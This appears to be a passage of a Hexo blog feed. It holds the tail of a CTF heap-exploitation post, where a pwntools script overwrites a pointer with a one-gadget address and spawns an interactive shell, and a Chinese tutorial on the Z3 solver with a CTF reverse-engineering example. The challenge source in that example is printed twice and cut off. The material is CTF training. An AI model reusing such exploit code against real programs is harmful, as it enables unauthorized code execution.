class="comment">#5</span></span><br><span class="line">create(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x23</span>-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">write(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase (0x119F)&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Fastbin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Z3库学习笔记</title>
      <link href="archives/f1cbbf85/"/>
      <url>archives/f1cbbf85/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 <a href="https://link.jianshu.com/?t=https://link.zhihu.com/?target=http://angr.io/">angr</a> 也内置了一个修改版的 Z3。</p><ul><li>官方使用文档：<a href="https://rise4fun.com/z3/tutorialcontent/guide">https://rise4fun.com/z3/tutorialcontent/guide</a></li><li>z3py 功能手册：<a href="https://z3prover.github.io/api/html/namespacez3py.html">https://z3prover.github.io/api/html/namespacez3py.html</a></li><li>z3py 使用文档：<a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></li><li>z3 所使用的语法标准：<a href="http://smtlib.cs.uiowa.edu/papers/smt-lib-reference-v2.6-r2017-07-18.pdf">http://smtlib.cs.uiowa.edu/papers/smt-lib-reference-v2.6-r2017-07-18.pdf</a></li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里安装的是 python 库版本，编译好的二进制版本在 <a href="https://github.com/Z3Prover/z3/releases">Github</a> 下载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)<span class="comment">#设置整型变量x</span></span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)<span class="comment">#设置整型变量y</span></span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)<span class="comment">#写入方程</span></span><br><span class="line"><span class="comment"># [y = 0, x = 7]</span></span><br></pre></td></tr></table></figure><h2 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h2><h3 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h3><blockquote><p>批量设置变量见[补充](# 补充)</p></blockquote><h4 id="Int-整数型"><a href="#Int-整数型" class="headerlink" title="Int - 整数型"></a>Int - 整数型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个变量</span></span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="comment"># 声明多个变量</span></span><br><span class="line">y,z = Ints(<span class="string">&#x27;y z&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>|</code> 运算需要初始化为<code>Int</code>变量</li></ul><h4 id="Real-实数型"><a href="#Real-实数型" class="headerlink" title="Real - 实数型"></a>Real - 实数型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个变量</span></span><br><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="comment"># 声明多个变量</span></span><br><span class="line">y,z = Reals(<span class="string">&#x27;y z&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="BitVec-向量（位运算）"><a href="#BitVec-向量（位运算）" class="headerlink" title="BitVec - 向量（位运算）"></a>BitVec - 向量（位运算）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 声明单个 16 位的变量</span></span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>,<span class="number">16</span>)</span><br><span class="line"><span class="comment"># 声明多个 16 位的变量</span></span><br><span class="line">y,z = BitVecs(<span class="string">&#x27;y z&#x27;</span>,<span class="number">16</span>)</span><br></pre></td></tr></table></figure><ul><li><p>只有 BitVec 变量可以进行<strong>异或</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solver.add(BitVec(<span class="string">&#x27;x&#x27;</span>,<span class="number">8</span>)^BitVec(<span class="string">&#x27;y&#x27;</span>,<span class="number">8</span>)==<span class="number">5</span>)</span><br></pre></td></tr></table></figure></li><li><p>BitVec 变量值之间可进行<code>&gt;</code>或<code>&lt;</code>或<code>=</code>或<code>&gt;=</code>或<code>&lt;=</code>的比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BitVec(<span class="string">&#x27;a&#x27;</span>,<span class="number">8</span>)&gt;=BitVec(<span class="string">&#x27;b&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">BitVec(<span class="string">&#x27;a&#x27;</span>,<span class="number">8</span>)&lt;=BitVec(<span class="string">&#x27;b&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">BitVec(<span class="string">&#x27;a&#x27;</span>,<span class="number">8</span>)&lt;=<span class="number">9</span></span><br><span class="line">BitVec(<span class="string">&#x27;a&#x27;</span>,<span class="number">8</span>)==<span class="number">9</span></span><br></pre></td></tr></table></figure></li><li><p>BitVecVal 值之间不能进行<code>&gt;</code>或<code>&lt;</code>比较,只能转换成 python 认识的类型才可以比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> BitVecVal(<span class="number">98</span>,<span class="number">8</span>)&gt;BitVecVal(<span class="number">97</span>,<span class="number">8</span>)<span class="comment">#错误，不是python类型</span></span><br><span class="line"><span class="keyword">if</span> BitVecVal(<span class="number">98</span>,<span class="number">8</span>)==<span class="number">98</span>:</span><br><span class="line"><span class="keyword">if</span> BitVecVal(<span class="number">98</span>,<span class="number">8</span>).as_long()&gt;<span class="number">97</span></span><br><span class="line"><span class="keyword">if</span> BitVecVal(<span class="number">98</span>,<span class="number">8</span>).as_long()&gt;BitVecVal(<span class="number">97</span>,<span class="number">8</span>).as_long()</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>变量设置的类型可能会影响到最后求解的结果。可以先 check 一下看看有没有解，然后再判断是否需要切换变量的类型。</p></blockquote><h3 id="Solver-对象"><a href="#Solver-对象" class="headerlink" title="Solver 对象"></a>Solver 对象</h3><p>实际做题时，约束条件肯定不会想上面例子这么少，所以需要实例化一个 <code>Solver()</code> 对象，方便我们添加更多的约束条件。</p><p>创建约束求解器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solver = Solver()</span><br></pre></td></tr></table></figure><h3 id="添加约束条件"><a href="#添加约束条件" class="headerlink" title="添加约束条件"></a>添加约束条件</h3><p>一行一个约束条件，这里的约束条件就是方程等式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">solver.add(x**<span class="number">2</span>+y**<span class="number">2</span>==<span class="number">74</span>)</span><br><span class="line">solver.add(x**<span class="number">5</span>-y==z)</span><br><span class="line"><span class="comment"># [y = -7, x = 5, z = 3132]</span></span><br></pre></td></tr></table></figure><p>z3 中不允许列表与列表之间添加<code>==</code>约束条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">prefix=[<span class="built_in">ord</span>(each) <span class="keyword">for</span> each <span class="keyword">in</span> <span class="string">&quot;flag&#123;&quot;</span>]</span><br><span class="line">plain_line=[Int(<span class="string">&#x27;x%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">s=Solver()</span><br><span class="line">z=<span class="number">0</span></span><br><span class="line"><span class="comment">#s.add(plain_line[z:z+5]==prefix) 列表==列表--&gt;错误</span></span><br><span class="line">s.add(plain_line[z]==prefix[<span class="number">0</span>])</span><br><span class="line">s.add(plain_line[z+<span class="number">1</span>]==prefix[<span class="number">1</span>])</span><br><span class="line">s.add(plain_line[z+<span class="number">2</span>]==prefix[<span class="number">2</span>])</span><br><span class="line">s.add(plain_line[z+<span class="number">3</span>]==prefix[<span class="number">3</span>])</span><br><span class="line">s.add(plain_line[z+<span class="number">4</span>]==prefix[<span class="number">4</span>])</span><br><span class="line">s.check()</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure><h3 id="判断是否有解"><a href="#判断是否有解" class="headerlink" title="判断是否有解"></a>判断是否有解</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    print(<span class="string">&quot;solver&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;no solver&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="求解并输出"><a href="#求解并输出" class="headerlink" title="求解并输出"></a>求解并输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ans = solver.model()</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="限制结果为可见字符"><a href="#限制结果为可见字符" class="headerlink" title="限制结果为可见字符"></a>限制结果为可见字符</h3><p>通常如果是做题的话，解密出来很可能是 flag ，也就是 ascii 码，所以为了进一步约束范围可以给每一个变量都加上额外的一条约束，约束其结果只能在可见 ascii 码范围以内：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">solver.add(x &lt; <span class="number">127</span>)</span><br><span class="line">solver.add(x &gt;= <span class="number">32</span>)</span><br></pre></td></tr></table></figure><h3 id="快速添加变量"><a href="#快速添加变量" class="headerlink" title="快速添加变量"></a>快速添加变量</h3><p>添加 50 个 Int 变量 s ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=[Int(<span class="string">&#x27;s%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br></pre></td></tr></table></figure><p>添加 50 个 Real 变量 s ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=[Real(<span class="string">&#x27;s%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br></pre></td></tr></table></figure><p>添加 50 个 16 位 BitVec 变量 s ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=[BitVec (<span class="string">&#x27;s%d&#x27;</span> % i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br></pre></td></tr></table></figure><p>在约束条件中用下标索引使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">solver.add(s[<span class="number">18</span>] * s[<span class="number">8</span>] == <span class="number">5</span>)</span><br><span class="line">solver.add(s[<span class="number">4</span>] * s[<span class="number">11</span>] == <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>将结果按顺序打印出来：</p><blockquote><p>这是使用列表管理变量的好处，如果不使用列表 print(answer) 输出的结果是无序的。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">answer=solver.model()</span><br><span class="line"><span class="comment">#print(answer)</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(answer[each]) <span class="keyword">for</span> each <span class="keyword">in</span> s])</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><h2 id="练习例题"><a href="#练习例题" class="headerlink" title="练习例题"></a>练习例题</h2><h3 id="2020-羊城杯-login"><a href="#2020-羊城杯-login" class="headerlink" title="2020 羊城杯 login"></a>2020 羊城杯 login</h3><p>题目前面还有一步逆向 pyinstaller 打包的 exe 文件，这里不赘述直接给出源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = <span class="built_in">input</span>(<span class="string">&#x27;input something:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input1) != <span class="number">14</span>:</span><br><span class="line">    print(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    code.append(<span class="built_in">ord</span>(input1[i]) ^ <span class="built_in">ord</span>(input1[i + <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">code.append(<span class="built_in">ord</span>(input1[<span class="number">13</span>]))</span><br><span class="line">a1 = code[<span class="number">2</span>]</span><br><span class="line">a2 = code[<span class="number">1</span>]</span><br><span class="line">a3 = code[<span class="number">0</span>]</span><br><span class="line">a4 = code[<span class="number">3</span>]</span><br><span class="line">a5 = code[<span class="number">4</span>]</span><br><span class="line">a6 = code[<span class="number">5</span>]</span><br><span class="line">a7 = code[<span class="number">6</span>]</span><br><span class="line">a8 = code[<span class="number">7</span>]</span><br><span class="line">a9 = code[<span class="number">9</span>]</span><br><span class="line">a10 = code[<span class="number">8</span>]</span><br><span class="line">a11 = code[<span class="number">10</span>]</span><br><span class="line">a12 = code[<span class="number">11</span>]</span><br><span class="line">a13 = code[<span class="number">12</span>]</span><br><span class="line">a14 = code[<span class="number">13</span>]</span><br><span class="line"><span class="keyword">if</span> ((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; ((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; ((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; ((((a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; ((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; ((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; ((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; ((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; ((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">    print(<span class="string">&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Congratulations and have fun!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Sorry,plz try again...&#x27;</span>)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">input1 = <span class="built_in">input</span>(<span class="string">&#x27;input something:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input1) != <span class="number">14</span>:</span><br><span class="line">    print(<span class="string">&#x27;Wrong length!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    code.append(<span class="built_in">ord</span>(input1[i]) ^ <span class="built_in">ord</span>(input1[i + <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">code.append(<span class="built_in">ord</span>(input1[<span class="number">13</span>]))</span><br><span class="line">a1 = code[<span class="number">2</span>]</span><br><span class="line">a2 = code[<span class="number">1</span>]</span><br><span class="line">a3 = code[<span class="number">0</span>]</span><br><span class="line">a4 = code[<span class="number">3</span>]</span><br><span class="line">a5 = code[<span class="number">4</span>]</span><br><span class="line">a6 = code[<span class="number">5</span>]</span><br><span class="line">a7 = code[<span class="number">6</span>]</span><br><span class="line">a8 = code[<span class="number">7</span>]</span><br><span class="line">a9 = code[<span class="number">9</span>]</span><br><span class="line">a10 = code[<span class="number">8</span>]</span><br><span class="line">a11 = code[<span class="number">10</span>]</span><br><span class="line">a12 = code[<span class="number">11</span>]</span><br><span class="line">a13 = code[<span class="number">12</span>]</span><br><span class="line">a14 = code[<span class="number">13</span>]</span><br><span class="line"><span class="keyword">if</span> ((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>) &amp; ((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>) &amp; ((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>) &amp; ((((a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">37136</span>) &amp; (((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) &amp; ((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>) &amp; ((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>) &amp; (((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) &amp; ((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span 